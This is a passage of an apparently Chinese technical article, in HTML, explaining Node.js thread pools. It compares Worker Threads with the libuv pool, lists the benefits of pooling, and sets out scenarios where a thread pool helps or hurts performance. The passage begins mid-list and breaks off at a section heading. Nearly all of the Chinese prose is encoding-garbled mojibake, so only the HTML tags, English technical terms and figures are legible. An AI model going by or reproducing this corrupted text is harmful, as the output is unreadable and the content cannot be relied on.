<p><strong>Worker Threadsï¼ˆå·¥ä½œçº¿ç¨‹ï¼‰</strong> ï¼šNode.js v10.5.0å¼•å…¥çš„å®˜æ–¹å¤šçº¿ç¨‹æ–¹æ¡ˆï¼ˆv14åç¨³å®šï¼‰ï¼Œå…è®¸å¼€å‘è€…ä¸»åŠ¨åˆ›å»ºç‹¬ç«‹çš„JavaScriptçº¿ç¨‹ï¼Œä¸»è¦ç”¨äºå¤„ç†â€œCPUå¯†é›†å‹JavaScriptä»»åŠ¡â€ï¼Œå¦‚ï¼š</p>
<blockquote>
<ol>
<li>å¤§è§„æ¨¡æ•°æ®è§£æï¼ˆå¦‚ç™¾ä¸‡è¡ŒExcelå¤„ç†ï¼‰ï¼›</li>
<li>å¤æ‚ä¸šåŠ¡è®¡ç®—ï¼ˆå¦‚è®¢å•é‡‘é¢æ±‡æ€»ã€æ•°æ®å»ºæ¨¡ï¼‰ï¼›</li>
<li>è‡ªå®šä¹‰åŠ å¯†ç®—æ³•å®ç°ã€‚</li>
</ol>
</blockquote>
</li>
</ol>
<p>è¿™ä¸¤ç±»çº¿ç¨‹å¹¶éæ›¿ä»£å…³ç³»ï¼Œè€Œæ˜¯åˆ†åˆ«åº”å¯¹â€œ<strong>ç³»ç»Ÿçº§I/O</strong>â€ä¸â€œ<strong>JSçº§è®¡ç®—</strong>â€ä¸¤ç±»é—®é¢˜ï¼Œå…±åŒæ„æˆNode.jsçš„å¤šçº¿ç¨‹èƒ½åŠ›åŸºç¡€ã€‚</p>
<h3 data-id="heading-4">1.2 çº¿ç¨‹æ± çš„æ ¸å¿ƒä»·å€¼ï¼šè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h3>
<p>çº¿ç¨‹æ± å¹¶éNode.jså†…ç½®çš„åŸºç¡€ç»„ä»¶ï¼Œè€Œæ˜¯åŸºäº<code>Worker Threads</code>æˆ–<code>libuv</code>å°è£…çš„â€œä»»åŠ¡ç®¡ç†å·¥å…·â€ã€‚è¦ç†è§£è¿™ä¸€è®¾è®¡çš„åˆç†æ€§ï¼Œæˆ‘ä»¬å…ˆä»å°è£…åŸºç¡€ä¸å¤ç”¨ç–‘é—®å…¥æ‰‹ï¼Œå†æ·±å…¥å…¶æ ¸å¿ƒä»·å€¼ã€‚</p>
<h4 data-id="heading-5">1.2.1 å°è£…åŸºç¡€ï¼šåŒ¹é…ä»»åŠ¡ç‰¹æ€§çš„ç»„ä»¶é€‰æ‹©</h4>
<p>çº¿ç¨‹æ± çš„å°è£…å¹¶ééšæ„é€‰æ‹©ï¼Œè€Œæ˜¯ä¸¥æ ¼éµå¾ªâ€œä»»åŠ¡ç±»å‹ä¸çº¿ç¨‹èƒ½åŠ›åŒ¹é…â€çš„æ ¸å¿ƒåŸåˆ™ï¼Œä¸¤è€…åˆ†åˆ«å¯¹åº”Node.jsçš„ä¸¤ç±»æ ¸å¿ƒè®¡ç®—åœºæ™¯ï¼Œå½¢æˆäº’è¡¥çš„å…¨åœºæ™¯è¦†ç›–èƒ½åŠ›ï¼š</p>
<ul>
<li><strong>åŸºäºWorker Threadså°è£…</strong>ï¼šé’ˆå¯¹â€œJavaScriptå±‚é¢çš„CPUå¯†é›†ä»»åŠ¡â€ï¼ˆå¦‚æ•°æ®è§£æã€è‡ªå®šä¹‰åŠ å¯†ï¼‰ã€‚Worker Threadsæ‹¥æœ‰ç‹¬ç«‹V8å¼•æ“å’Œè°ƒç”¨æ ˆï¼Œå¯ç›´æ¥æ‰§è¡ŒJavaScriptä»£ç ï¼Œä¸”æ”¯æŒä¸ä¸»çº¿ç¨‹å…±äº«å†…å­˜ï¼Œå®Œç¾é€‚é…éœ€è¦å¤æ‚JSé€»è¾‘è®¡ç®—çš„åœºæ™¯ï¼›</li>
<li><strong>åŸºäºlibuvå°è£…</strong>ï¼šé’ˆå¯¹â€œç³»ç»Ÿçº§çš„CPUå¯†é›†ä»»åŠ¡â€ï¼ˆå¦‚åº•å±‚å‹ç¼©ç®—æ³•ã€åŸç”ŸåŠ å¯†åº“è°ƒç”¨ï¼‰ã€‚libuvçº¿ç¨‹æ± æ˜¯Cè¯­è¨€å®ç°çš„ç³»ç»Ÿçº§çº¿ç¨‹ï¼Œæ‰§è¡Œåº•å±‚ä»£ç æ—¶é¿å…äº†V8å¼•æ“çš„å¼€é”€ï¼Œæ›´é€‚åˆä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„è®¡ç®—ä»»åŠ¡ã€‚</li>
</ul>
<p>ç®€å•è¯´ï¼Œä¸¤ç±»å°è£…åˆ†åˆ«è§£å†³â€œJSçº§è®¡ç®—â€å’Œâ€œç³»ç»Ÿçº§è®¡ç®—â€çš„ç®¡ç†é—®é¢˜ï¼Œè¿™æ˜¯çº¿ç¨‹æ± å®ç°â€œå…¨åœºæ™¯CPUå¯†é›†ä»»åŠ¡ç®¡æ§â€çš„åŸºç¡€ã€‚</p>
<h4 data-id="heading-6">1.2.2 æ ¸å¿ƒç–‘é—®ï¼šä¸ºä½•ä¸ç›´æ¥å¤ç”¨libuvçº¿ç¨‹æ± ï¼Ÿ</h4>
<p>å¾ˆå¤šå¼€å‘è€…ä¼šç–‘æƒ‘ï¼šæ—¢ç„¶libuvçº¿ç¨‹æ± å·²å…·å¤‡å¤šçº¿ç¨‹èƒ½åŠ›ï¼Œä¸ºä½•è¿˜è¦é¢å¤–å°è£…çº¿ç¨‹æ± ï¼Ÿæ ¸å¿ƒåŸå› åœ¨äºå…¶è®¾è®¡å®šä½ä¸CPUå¯†é›†ä»»åŠ¡éœ€æ±‚å­˜åœ¨æ ¹æœ¬å†²çªï¼Œç›´æ¥å¤ç”¨ä¼šå¼•å‘ä¸¥é‡æ€§èƒ½é—®é¢˜ï¼Œå…·ä½“ä½“ç°åœ¨ä¸‰ç‚¹ï¼š</p>
<h5 data-id="heading-7">1. è®¾è®¡å®šä½å†²çªï¼šI/Oé™„å±çº¿ç¨‹ vs è®¡ç®—æ ¸å¿ƒçº¿ç¨‹</h5>
<p>libuvçº¿ç¨‹æ± çš„æ ¸å¿ƒä½œç”¨æ˜¯â€œè§£æ”¾ä¸»çº¿ç¨‹çš„I/Oç­‰å¾…â€ï¼Œè€Œéâ€œæ‰¿è½½é«˜å¼ºåº¦è®¡ç®—â€ã€‚å®ƒä¼šä¼˜å…ˆä¿éšœæ–‡ä»¶I/Oã€DNSæŸ¥è¯¢ç­‰ä»»åŠ¡çš„æ‰§è¡Œï¼Œè‹¥å¼ºè¡Œå°†CPUå¯†é›†ä»»åŠ¡å¡å…¥ï¼Œä¼šæŠ¢å I/Oä»»åŠ¡çš„çº¿ç¨‹èµ„æºï¼Œå¯¼è‡´æ•´ä¸ªæœåŠ¡çš„I/Oå“åº”å»¶è¿Ÿã€‚ä¾‹å¦‚ï¼šæŸæœåŠ¡å°†Excelè§£æä»»åŠ¡æ”¾å…¥libuvçº¿ç¨‹æ± åï¼Œæ–‡ä»¶è¯»å†™æ¥å£çš„å“åº”æ—¶é—´ä»20mså¢è‡³150msã€‚</p>
<h5 data-id="heading-8">2. ä»»åŠ¡ç‰¹æ€§ä¸åŒ¹é…ï¼šçŸ­ç­‰å¾…ä»»åŠ¡ vs é•¿è®¡ç®—ä»»åŠ¡</h5>
<p>libuvçº¿ç¨‹æ± ä¼˜åŒ–çš„æ˜¯â€œçŸ­æ‰§è¡Œ+é•¿ç­‰å¾…â€çš„I/Oä»»åŠ¡ï¼Œè€ŒCPUå¯†é›†ä»»åŠ¡æ˜¯â€œé•¿æ‰§è¡Œ+çŸ­ç­‰å¾…â€ï¼Œä¸¤è€…å¯¹çº¿ç¨‹çš„å ç”¨æ¨¡å¼å®Œå…¨ä¸åŒã€‚ç”¨libuvçº¿ç¨‹æ± å¤„ç†CPUå¯†é›†ä»»åŠ¡ï¼Œä¼šå¯¼è‡´çº¿ç¨‹é•¿æœŸè¢«å ç”¨ï¼Œå½¢æˆâ€œçº¿ç¨‹é¥¥é¥¿â€â€”â€”åç»­I/Oä»»åŠ¡æ— æ³•è·å–çº¿ç¨‹æ‰§è¡Œï¼Œå‡ºç°â€œCPUæ²¡è·‘æ»¡ä½†I/Oé˜»å¡â€çš„çŸ›ç›¾çŠ¶æ€ã€‚</p>
<h5 data-id="heading-9">3. ç®¡æ§èƒ½åŠ›ç¼ºå¤±ï¼šå›ºå®šé…ç½® vs çµæ´»è°ƒåº¦</h5>
<p>libuvçº¿ç¨‹æ± çš„çº¿ç¨‹æ•°é…ç½®ç®€å•ï¼ˆé€šè¿‡ç¯å¢ƒå˜é‡<code>UV_THREADPOOL_SIZE</code>å…¨å±€è®¾ç½®ï¼‰ï¼Œä¸æ”¯æŒä»»åŠ¡é˜Ÿåˆ—ã€è¶…æ—¶æ§åˆ¶ç­‰ç”Ÿäº§çº§èƒ½åŠ›ã€‚ä¾‹å¦‚ï¼šæ— æ³•ä¸ºåŠ å¯†ä»»åŠ¡è®¾ç½®10ç§’è¶…æ—¶ï¼Œè‹¥ä»»åŠ¡å¼‚å¸¸é˜»å¡ï¼Œä¼šå¯¼è‡´libuvçº¿ç¨‹æ°¸ä¹…æŒ‚èµ·ï¼Œä¸”æ— è‡ªåŠ¨æ¢å¤æœºåˆ¶ã€‚</p>
<p>æ­£æ˜¯è¿™äº›å·®å¼‚ï¼Œå†³å®šäº†Node.jsçº¿ç¨‹æ± éœ€è¦åŸºäºWorker Threadsï¼ˆä¸»åŠ›å¤„ç†JSè®¡ç®—ï¼‰æˆ–libuvï¼ˆè¾…åŠ©å¤„ç†ç³»ç»Ÿçº§è®¡ç®—ï¼‰å°è£…ä¸“å±ç®¡ç†å·¥å…·ï¼Œè€Œéç›´æ¥å¤ç”¨libuvçº¿ç¨‹æ± ã€‚å…¶è¯ç”Ÿå¹¶éä¸ºäº†â€œåˆ›é€ å¤šçº¿ç¨‹èƒ½åŠ›â€ï¼Œè€Œæ˜¯ä¸ºäº†è§£å†³â€œç›´æ¥ä½¿ç”¨å¤šçº¿ç¨‹æ—¶çš„ç—›ç‚¹â€ï¼Œæ ¸å¿ƒä»·å€¼ä½“ç°åœ¨ä¸‰ä¸ªç»´åº¦ã€‚</p>
<h4 data-id="heading-10">1.2.3 ä»·å€¼ä¸€ï¼šè§£è€¦ä¸»çº¿ç¨‹ä¸è®¡ç®—ä»»åŠ¡ï¼Œé¿å…é˜»å¡</h4>
<p>è¿™æ˜¯çº¿ç¨‹æ± æœ€ç›´æ¥çš„ä»·å€¼ï¼Œä¹Ÿæ˜¯è§£å†³å‰æ–‡æåŠâ€œæœåŠ¡å¡é¡¿â€çš„å…³é”®ã€‚ç›´æ¥åœ¨ä¸»çº¿ç¨‹æ‰§è¡ŒCPUå¯†é›†ä»»åŠ¡ï¼Œä¼šå¯¼è‡´EventLoopé˜»å¡ï¼Œè¡¨ç°ä¸ºï¼š</p>
<ul>
<li>æ–°è¯·æ±‚æ— æ³•åŠæ—¶å“åº”ï¼Œæ¥å£è¶…æ—¶ç‡é£™å‡ï¼›</li>
<li>åŸºç¡€ç›‘æ§æ¥å£ï¼ˆå¦‚<code>/health</code>ï¼‰æ— æ³•æ­£å¸¸è¿”å›ï¼Œè§¦å‘æœåŠ¡å‘Šè­¦ï¼›</li>
<li>EventLoopå»¶è¿Ÿï¼ˆ<code>event_loop_delay</code>ï¼‰ä»å‡ åæ¯«ç§’æš´æ¶¨è‡³æ•°ç™¾ç”šè‡³æ•°ç§’ã€‚</li>
</ul>
<p>çº¿ç¨‹æ± é€šè¿‡å°†CPUå¯†é›†ä»»åŠ¡è½¬ç§»è‡³Workerçº¿ç¨‹æ‰§è¡Œï¼Œä½¿ä¸»çº¿ç¨‹ä»…è´Ÿè´£â€œæ¥æ”¶è¯·æ±‚ã€åˆ†å‘ä»»åŠ¡ã€è¿”å›ç»“æœâ€çš„è°ƒåº¦å·¥ä½œï¼Œå½»åº•é¿å…äº†ä¸»çº¿ç¨‹é˜»å¡ã€‚æŸæ”¯ä»˜æœåŠ¡çš„å®æµ‹æ•°æ®æ˜¾ç¤ºï¼šå°†RSAåŠ å¯†ä»»åŠ¡è¿ç§»è‡³çº¿ç¨‹æ± åï¼Œä¸»çº¿ç¨‹<code>event_loop_delay</code>ä»800msé™è‡³10msä»¥å†…ï¼Œæ¥å£å“åº”æ—¶é—´ä»500ms+ä¼˜åŒ–è‡³50msä»¥å†…ã€‚</p>
<h4 data-id="heading-11">1.2.4 ä»·å€¼äºŒï¼šå¤ç”¨çº¿ç¨‹èµ„æºï¼Œé™ä½æ€§èƒ½æŸè€—</h4>
<p>æœ‰å¼€å‘è€…æå‡ºï¼šâ€œæ— éœ€çº¿ç¨‹æ± ï¼Œç›´æ¥åˆ›å»ºWorkerçº¿ç¨‹å¤„ç†ä»»åŠ¡å³å¯â€ã€‚è¿™ç§æ–¹æ¡ˆåœ¨ä½å¹¶å‘åœºæ™¯ä¸‹å¯è¡Œï¼Œä½†é«˜å¹¶å‘åœºæ™¯ä¼šæš´éœ²è‡´å‘½é—®é¢˜â€”â€”çº¿ç¨‹åˆ›å»ºä¸é”€æ¯çš„æ€§èƒ½æŸè€—æé«˜ã€‚</p>
<p>Workerçº¿ç¨‹çš„èµ„æºæˆæœ¬ä½“ç°åœ¨ä¸¤æ–¹é¢ï¼š</p>
<ul>
<li><strong>æ—¶é—´æˆæœ¬</strong>ï¼šåˆ›å»º1ä¸ªWorkerçº¿ç¨‹éœ€åˆå§‹åŒ–ç‹¬ç«‹V8å¼•æ“ï¼Œè€—æ—¶çº¦10-20msï¼›é”€æ¯çº¿ç¨‹éœ€é‡Šæ”¾å†…å­˜ã€å…³é—­é€šä¿¡é€šé“ï¼Œè€—æ—¶çº¦5msï¼›</li>
<li><strong>å†…å­˜æˆæœ¬</strong>ï¼šæ¯ä¸ªWorkerçº¿ç¨‹åˆå§‹å†…å­˜å ç”¨çº¦2MBï¼Œè‹¥æ¯ç§’åˆ›å»º100ä¸ªçº¿ç¨‹ï¼Œ1åˆ†é’Ÿå†…å†…å­˜å ç”¨å°†çªç ´1.2GBã€‚</li>
</ul>
<p>çº¿ç¨‹æ± çš„â€œæ± åŒ–æ€æƒ³â€æ°å¥½è§£å†³è¿™ä¸€é—®é¢˜ï¼šæå‰åˆ›å»ºä¸€æ‰¹æ ¸å¿ƒçº¿ç¨‹å¹¶ç»´æŠ¤åœ¨æ± ä¸­ï¼Œä»»åŠ¡åˆ°è¾¾æ—¶ç›´æ¥åˆ†é…ç©ºé—²çº¿ç¨‹æ‰§è¡Œï¼Œä»»åŠ¡å®Œæˆåçº¿ç¨‹å›å½’æ± ä¸­å¾…å‘½ï¼Œè€Œéé”€æ¯ã€‚è¿™ä¸€æœºåˆ¶å°†çº¿ç¨‹åˆ›å»º/é”€æ¯çš„å¼€é”€é™ä¸ºé›¶ï¼ŒæŸåŠ å¯†æœåŠ¡çš„å®æµ‹æ˜¾ç¤ºï¼šä½¿ç”¨çº¿ç¨‹æ± åï¼Œé«˜å¹¶å‘åœºæ™¯ä¸‹çš„å†…å­˜å ç”¨é™ä½60%ï¼ŒGCè§¦å‘é¢‘ç‡å‡å°‘75%ã€‚</p>
<h4 data-id="heading-12">1.2.5 ä»·å€¼ä¸‰ï¼šæä¾›å¯æ§çš„ä»»åŠ¡ç®¡ç†èƒ½åŠ›</h4>
<p>ç›´æ¥ä½¿ç”¨Worker Threadsä»…èƒ½å®ç°â€œä»»åŠ¡åˆ†å‘ä¸æ‰§è¡Œâ€ï¼Œä½†ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦æ›´ç²¾ç»†çš„ä»»åŠ¡ç®¡æ§èƒ½åŠ›ï¼Œè¿™äº›å‡ç”±çº¿ç¨‹æ± å°è£…å®ç°ï¼š</p>
<ul>
<li><strong>ä»»åŠ¡é˜Ÿåˆ—ç¼“å†²</strong>ï¼šå³°å€¼æ—¶æ®µä»»åŠ¡é‡è¶…è¿‡çº¿ç¨‹å¤„ç†èƒ½åŠ›æ—¶ï¼Œçº¿ç¨‹æ± å°†ä»»åŠ¡æ”¾å…¥é˜Ÿåˆ—ç­‰å¾…ï¼Œé¿å…ä»»åŠ¡ä¸¢å¤±ï¼›</li>
<li><strong>ä»»åŠ¡ä¼˜å…ˆçº§è°ƒåº¦</strong>ï¼šæ”¯æŒä¸ºä»»åŠ¡æ ‡è®°ä¼˜å…ˆçº§ï¼ˆå¦‚P0æ ¸å¿ƒä»»åŠ¡ã€P3æ™®é€šä»»åŠ¡ï¼‰ï¼Œç¡®ä¿æ ¸å¿ƒä¸šåŠ¡ä¼˜å…ˆæ‰§è¡Œï¼›</li>
<li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šä¸ºä»»åŠ¡è®¾ç½®æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼Œè¶…æ—¶æ—¶è‡ªåŠ¨ç»ˆæ­¢ä»»åŠ¡å¹¶å›æ”¶çº¿ç¨‹ï¼Œé¿å…çº¿ç¨‹è¢«å¼‚å¸¸ä»»åŠ¡é•¿æœŸå ç”¨ï¼›</li>
<li><strong>çº¿ç¨‹å¥åº·æ£€æŸ¥</strong>ï¼šWorkerçº¿ç¨‹å› å†…å­˜æº¢å‡ºæˆ–ä»£ç å¼‚å¸¸å´©æºƒæ—¶ï¼Œçº¿ç¨‹æ± è‡ªåŠ¨åˆ›å»ºæ–°çº¿ç¨‹è¡¥å……ï¼Œä¿éšœæœåŠ¡å¯ç”¨æ€§ï¼›</li>
<li><strong>èµ„æºé™åˆ¶</strong>ï¼šé€šè¿‡é…ç½®æœ€å¤§çº¿ç¨‹æ•°ï¼Œé¿å…çº¿ç¨‹è¿‡å¤šå¯¼è‡´CPUä¸Šä¸‹æ–‡åˆ‡æ¢é¢‘ç¹ï¼Œåè€Œé™ä½æ€§èƒ½ã€‚</li>
</ul>
<p>è¿™äº›èƒ½åŠ›æ˜¯ç”Ÿäº§çº§æœåŠ¡çš„å¿…å¤‡è¦æ±‚ï¼Œä¹Ÿæ˜¯çº¿ç¨‹æ± åŒºåˆ«äºâ€œåŸç”ŸWorker Threadsâ€çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-13">1.3 çº¿ç¨‹æ± çš„é€‚ç”¨åœºæ™¯ä¸ç¦å¿Œ</h3>
<p>çº¿ç¨‹æ± å¹¶éâ€œä¸‡èƒ½å·¥å…·â€ï¼Œå…¶é€‚ç”¨åœºæ™¯ä¸Node.jså¤šçº¿ç¨‹çš„ç‰¹æ€§å¼ºç›¸å…³ã€‚é”™è¯¯ä½¿ç”¨çº¿ç¨‹æ± ä¸ä»…æ— æ³•æå‡æ€§èƒ½ï¼Œåè€Œä¼šå¯¼è‡´èµ„æºæµªè´¹ã€å“åº”å»¶è¿Ÿç­‰é—®é¢˜ã€‚ä»¥ä¸‹æ˜ç¡®å…¶é€‚ç”¨åœºæ™¯ä¸ä½¿ç”¨ç¦å¿Œã€‚</p>
<h4 data-id="heading-14">1.3.1 é€‚ç”¨åœºæ™¯ï¼šä¸‰ç±»å¿…é¡»ç”¨çº¿ç¨‹æ± çš„åœºæ™¯</h4>
<p>çº¿ç¨‹æ± çš„æ ¸å¿ƒé€‚ç”¨åœºæ™¯ï¼Œé›†ä¸­åœ¨â€œä¸»çº¿ç¨‹æ— æ³•é«˜æ•ˆå¤„ç†â€çš„ä»»åŠ¡ç±»å‹ï¼Œå…·ä½“å¯åˆ†ä¸ºä¸‰ç±»ï¼š</p>
<h5 data-id="heading-15">åœºæ™¯ä¸€ï¼šCPUå¯†é›†å‹JavaScriptä»»åŠ¡</h5>
<p>è¿™æ˜¯çº¿ç¨‹æ± æœ€æ ¸å¿ƒçš„é€‚ç”¨åœºæ™¯ï¼ŒæŒ‡â€œéœ€è¦å¤§é‡JavaScriptè®¡ç®—â€çš„ä»»åŠ¡ï¼Œå…¸å‹åŒ…æ‹¬ï¼š</p>
<ul>
<li>åŠ å¯†/è§£å¯†ï¼šå¦‚RSAã€AESåŠ å¯†éªŒç­¾ï¼Œå°¤å…¶æ˜¯å¤§æ–‡ä»¶åŠ å¯†ï¼›</li>
<li>æ•°æ®è§£æï¼šå¦‚ç™¾ä¸‡è¡ŒExcel/CSVæ–‡ä»¶è§£æã€JSONå¤§æ–‡ä»¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼›</li>
<li>å¤æ‚è®¡ç®—ï¼šå¦‚è®¢å•é‡‘é¢æ±‡æ€»ã€æ•°æ®æ’åºä¸è¿‡æ»¤ã€ç®€å•AIæ¨¡å‹æ¨ç†ã€‚</li>
</ul>
<p>è¿™ç±»ä»»åŠ¡çš„ç‰¹ç‚¹æ˜¯â€œæ‰§è¡Œæ—¶é—´é•¿ï¼ˆé€šå¸¸è¶…è¿‡10msï¼‰â€ï¼Œç›´æ¥åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œä¼šä¸¥é‡é˜»å¡EventLoopã€‚é€šè¿‡çº¿ç¨‹æ± åˆ†é…è‡³Workerçº¿ç¨‹æ‰§è¡Œï¼Œå¯å®ç°â€œè®¡ç®—ä¸è°ƒåº¦å¹¶è¡Œâ€ï¼Œæ˜¾è‘—æå‡æœåŠ¡ååé‡ã€‚</p>
<h5 data-id="heading-16">åœºæ™¯äºŒï¼šæ‰¹é‡å¼‚æ­¥ä»»åŠ¡å¤„ç†</h5>
<p>éƒ¨åˆ†ä¸šåŠ¡åœºæ™¯éœ€è¦æ‰¹é‡æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡ï¼ˆå¦‚æ‰¹é‡æ•°æ®åŒæ­¥ã€æ‰¹é‡æ–‡ä»¶å¤„ç†ï¼‰ï¼Œè‹¥ç›´æ¥åœ¨ä¸»çº¿ç¨‹å¾ªç¯å‘èµ·ä»»åŠ¡ï¼Œä¼šå¯¼è‡´å›è°ƒå †ç§¯ï¼›è‹¥å•ä¸ªä»»åŠ¡æ‰§è¡Œæ—¶é—´é•¿ï¼Œæ•´ä½“è€—æ—¶ä¼šå‘ˆçº¿æ€§å¢é•¿ã€‚</p>
<p>é€šè¿‡çº¿ç¨‹æ± ç®¡ç†æ‰¹é‡ä»»åŠ¡ï¼Œå¯å®ç°â€œä»»åŠ¡å¹¶è¡Œæ‰§è¡Œâ€ä¸â€œå¹¶å‘æ•°æ§åˆ¶â€çš„å¹³è¡¡ã€‚ä¾‹å¦‚ï¼šæ‰¹é‡åŒæ­¥1000æ¡æ•°æ®è‡³æ•°æ®åº“ï¼Œä½¿ç”¨çº¿ç¨‹æ± é…ç½®10ä¸ªçº¿ç¨‹å¹¶è¡Œæ‰§è¡Œï¼Œæ•´ä½“è€—æ—¶ä»100ç§’ï¼ˆå•çº¿ç¨‹ï¼‰é™è‡³15ç§’ï¼ˆ10çº¿ç¨‹ï¼‰ï¼ŒåŒæ—¶é¿å…å¹¶å‘è¿‡é«˜å¯¼è‡´æ•°æ®åº“å‹åŠ›è¿‡å¤§ã€‚</p>
<h5 data-id="heading-17">åœºæ™¯ä¸‰ï¼šèµ„æºå—é™çš„è¾¹ç¼˜è®¡ç®—åœºæ™¯</h5>
<p>åœ¨è¾¹ç¼˜è®¾å¤‡ï¼ˆå¦‚ç‰©è”ç½‘ç½‘å…³ã€å°å‹æœåŠ¡å™¨ï¼‰ä¸Šè¿è¡ŒNode.jsæœåŠ¡æ—¶ï¼Œç¡¬ä»¶èµ„æºï¼ˆCPUã€å†…å­˜ï¼‰æœ‰é™ï¼Œæ— æ³•æ”¯æŒå¤§é‡çº¿ç¨‹åˆ›å»ºã€‚çº¿ç¨‹æ± é€šè¿‡â€œçº¿ç¨‹å¤ç”¨â€ä¸â€œèµ„æºé™åˆ¶â€ç‰¹æ€§ï¼Œå¯åœ¨æœ‰é™èµ„æºä¸‹æœ€å¤§åŒ–ä»»åŠ¡å¤„ç†èƒ½åŠ›ã€‚</p>
<p>ä¾‹å¦‚ï¼šæŸè¾¹ç¼˜ç½‘å…³éœ€å¤„ç†è®¾å¤‡ä¸Šä¼ çš„ä¼ æ„Ÿå™¨æ•°æ®ï¼ˆæ•°æ®è§£æä¸ºCPUå¯†é›†ä»»åŠ¡ï¼‰ï¼Œé…ç½®çº¿ç¨‹æ± æœ€å¤§çº¿ç¨‹æ•°ä¸º4ï¼Œæ—¢é¿å…çº¿ç¨‹è¿‡å¤šå ç”¨å†…å­˜ï¼Œåˆèƒ½å¹¶è¡Œå¤„ç†å¤šè®¾å¤‡æ•°æ®ã€‚</p>
<h4 data-id="heading-18">1.3.2 ä½¿ç”¨ç¦å¿Œï¼šä¸‰ç±»ä¸åº”ä½¿ç”¨çº¿ç¨‹æ± çš„åœºæ™¯</h4>
<p>ä»¥ä¸‹åœºæ™¯ä¸­ï¼Œçº¿ç¨‹æ± çš„â€œçº¿ç¨‹ç®¡ç†å¼€é”€â€ä¼šè¶…è¿‡å…¶å¸¦æ¥çš„æ”¶ç›Šï¼Œåº”é¿å…ä½¿ç”¨ï¼š</p>
<h5 data-id="heading-19">ç¦å¿Œä¸€ï¼šçº¯I/Oå¯†é›†å‹ä»»åŠ¡</h5>
<p>å¯¹äºæ•°æ®åº“æŸ¥è¯¢ã€HTTPè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ç­‰çº¯I/Oå¯†é›†ä»»åŠ¡ï¼ŒNode.jsçš„EventLoop+libuvçº¿ç¨‹æ± å·²èƒ½é«˜æ•ˆå¤„ç†ï¼Œæ— éœ€é¢å¤–å¼•å…¥çº¿ç¨‹æ± ã€‚è¿™ç±»ä»»åŠ¡çš„æ ¸å¿ƒè€—æ—¶åœ¨â€œç­‰å¾…I/Oå“åº”â€ï¼ˆå¦‚ç­‰å¾…æ•°æ®åº“è¿”å›ç»“æœï¼‰ï¼Œè€Œéâ€œJavaScriptè®¡ç®—â€ï¼Œä¸»çº¿ç¨‹å¯é€šè¿‡å¼‚æ­¥å›è°ƒé«˜æ•ˆè°ƒåº¦ã€‚</p>
<p>è‹¥ä¸ºI/Oå¯†é›†ä»»åŠ¡å¼•å…¥çº¿ç¨‹æ± ï¼Œä¼šå¢åŠ â€œçº¿ç¨‹åˆ›å»ºã€æ•°æ®é€šä¿¡â€çš„é¢å¤–å¼€é”€ï¼Œåè€Œå¯¼è‡´æ¥å£å“åº”æ—¶é—´å¢åŠ ã€‚ä¾‹å¦‚ï¼šæŸæ•°æ®åº“æŸ¥è¯¢æ¥å£ï¼Œç›´æ¥ä½¿ç”¨å¼‚æ­¥APIå“åº”æ—¶é—´ä¸º50msï¼Œå¼•å…¥çº¿ç¨‹æ± åå“åº”æ—¶é—´å¢è‡³80msã€‚</p>
<h5 data-id="heading-20">ç¦å¿ŒäºŒï¼šè½»é‡ä¸”é«˜é¢‘çš„ä»»åŠ¡</h5>
<p>å¯¹äºæ‰§è¡Œæ—¶é—´æçŸ­ï¼ˆå¦‚å°äº1msï¼‰çš„è½»é‡ä»»åŠ¡ï¼ˆå¦‚ç®€å•æ•°æ®æ ¼å¼è½¬æ¢ã€æ•°å€¼è®¡ç®—ï¼‰ï¼Œçº¿ç¨‹æ± çš„â€œä»»åŠ¡åˆ†å‘+çº¿ç¨‹é€šä¿¡â€å¼€é”€ä¼šè¿œå¤§äºä»»åŠ¡æœ¬èº«çš„æ‰§è¡Œæ—¶é—´ï¼Œé€ æˆâ€œå¾—ä¸å¿å¤±â€çš„ç»“æœã€‚</p>
<p>ä¾‹å¦‚ï¼šæŸæ¥å£éœ€å¯¹è¯·æ±‚å‚æ•°åšç®€å•çš„MD5å“ˆå¸Œè®¡ç®—ï¼ˆæ‰§è¡Œæ—¶é—´çº¦0.1msï¼‰ï¼Œç›´æ¥åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œå³å¯ï¼›è‹¥é€šè¿‡çº¿ç¨‹æ± å¤„ç†ï¼Œä»…æ•°æ®ä»ä¸»çº¿ç¨‹ä¼ é€’è‡³Workerçº¿ç¨‹çš„è€—æ—¶å°±è¾¾0.5msï¼Œæ•´ä½“æ€§èƒ½åè€Œä¸‹é™ã€‚</p>
<h5 data-id="heading-21">ç¦å¿Œä¸‰ï¼šéœ€è¦é¢‘ç¹å…±äº«çŠ¶æ€çš„ä»»åŠ¡</h5>
<p>Workerçº¿ç¨‹ä¸ä¸»çº¿ç¨‹è™½å¯é€šè¿‡SharedArrayBufferå…±äº«å†…å­˜ï¼Œä½†çº¿ç¨‹é—´æ•°æ®é€šä¿¡ä»éœ€é€šè¿‡â€œåºåˆ—åŒ–/ååºåˆ—åŒ–â€å®ç°ï¼ˆå¦‚ä¼ é€’JSONå¯¹è±¡ï¼‰ï¼Œé€šä¿¡æˆæœ¬è¾ƒé«˜ã€‚è‹¥ä»»åŠ¡éœ€è¦é¢‘ç¹å…±äº«ã€ä¿®æ”¹çŠ¶æ€ï¼ˆå¦‚å¤šä¸ªä»»åŠ¡æ“ä½œåŒä¸€å˜é‡ï¼‰ï¼Œä¼šå¯¼è‡´å¤§é‡æ•°æ®ä¼ è¾“ï¼Œé™ä½æ€§èƒ½ã€‚</p>
<p>è¿™ç±»åœºæ™¯æ›´é€‚åˆä½¿ç”¨å•çº¿ç¨‹æ‰§è¡Œï¼Œæˆ–é€šè¿‡Redisç­‰å¤–éƒ¨å­˜å‚¨å®ç°çŠ¶æ€å…±äº«ï¼Œè€Œéä¾èµ–çº¿ç¨‹æ± çš„çº¿ç¨‹é—´é€šä¿¡ã€‚</p>
<h4 data-id="heading-22">1.3.3 å†³ç­–æŒ‡å—ï¼šæ˜¯å¦ä½¿ç”¨çº¿ç¨‹æ± çš„åˆ¤æ–­å…¬å¼</h4>
